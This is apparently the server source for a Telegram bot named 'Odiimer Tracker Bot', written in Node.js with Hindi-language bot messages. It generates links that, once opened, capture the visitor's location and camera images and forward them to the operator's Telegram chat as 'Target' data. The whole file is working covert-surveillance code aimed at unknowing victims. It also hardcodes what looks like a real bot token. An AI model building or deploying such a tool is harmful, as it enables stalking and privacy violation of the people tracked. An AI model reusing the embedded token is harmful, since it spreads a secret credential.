const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Telegram Bot Token
const token = '8786094194:AAF6p3VRITap85oCBEVQRkVzVbyhIXBpz0Q';
const bot = new TelegramBot(token, { polling: true });

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');

// /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📍 Location Track Link', callback_data: 'gen_location' }],
                [{ text: '📸 Camera Capture Link', callback_data: 'gen_camera' }],
                [{ text: '🔗 Both (Location + Camera)', callback_data: 'gen_both' }]
            ]
        }
    };

    bot.sendMessage(chatId, "🤖 *Odiimer Tracker Bot*\n\nNeeche diye gaye buttons par click karke tracking link generate karein:", { parse_mode: 'Markdown', ...opts });
});

// Button Click Handling
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    
    const timestamp = Date.now();
    let mode = 'location';

    if (data === 'gen_location') mode = 'location';
    else if (data === 'gen_camera') mode = 'camera';
    else if (data === 'gen_both') mode = 'both';

    // Proper underscore separated sessionId
    const sessionId = `${chatId}_${timestamp}_${mode}`;
    
    const domain = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
    const trackingLink = `${domain}/track/${sessionId}`;

    let title = mode === 'location' ? '📍 Location Tracker Link' : mode === 'camera' ? '📸 Camera Capture Link' : '🔗 Both (Location + Camera) Link';

    bot.sendMessage(chatId, `✅ *${title} Generated:*\n\n${trackingLink}`, { parse_mode: 'Markdown' });
    bot.answerCallbackQuery(callbackQuery.id);
});

// Tracking Page Route
app.get('/track/:id', (req, res) => {
    const sessionId = req.params.id;
    const parts = sessionId.split('_');
    const mode = (parts.length > 2 && parts[2]) ? parts[2] : 'location';
    
    res.render('index', { sessionId, mode });
});

// Socket.io Real-time connection
io.on('connection', (socket) => {
    console.log('🔗 User connected to tracking page');

    socket.on('join-room', (roomId) => {
        socket.join(roomId);
        console.log(`User joined room: ${roomId}`);
    });

    socket.on('tracker-data', async (data) => {
        console.log('Data received from target!');
        
        if (!data.roomId) return;
        
        // Safely extract pure Telegram Chat ID from roomId
        const parts = data.roomId.split('_');
        let targetChatId = parts[0];
        targetChatId = targetChatId.replace(/\D/g, ''); // Keep only numbers

        console.log(`Target Chat ID to send: ${targetChatId}`);

        if (targetChatId) {
            try {
                // Send Location
                if (data.latitude && data.longitude && data.latitude !== 0) {
                    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                    const message = `📍 Target Location Received!\n\nLat: ${data.latitude}\nLong: ${data.longitude}\nAccuracy: ${data.accuracy}m\n\nGoogle Maps:\n${mapLink}`;
                    await bot.sendMessage(targetChatId, message);
                }

                // Send Photo
                if (data.image && data.image.includes(',')) {
                    const base64Data = data.image.split(',')[1];
                    const buffer = Buffer.from(base64Data, 'base64');
                    
                    const filePath = path.join(__dirname, `capture_${Date.now()}.png`);
                    fs.writeFileSync(filePath, buffer);

                    await bot.sendPhoto(targetChatId, filePath, { caption: '📸 Target Camera Capture' });

                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                    }
                }
            } catch (err) {
                console.log('Telegram Sending Error:', err.message);
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}...`);
});
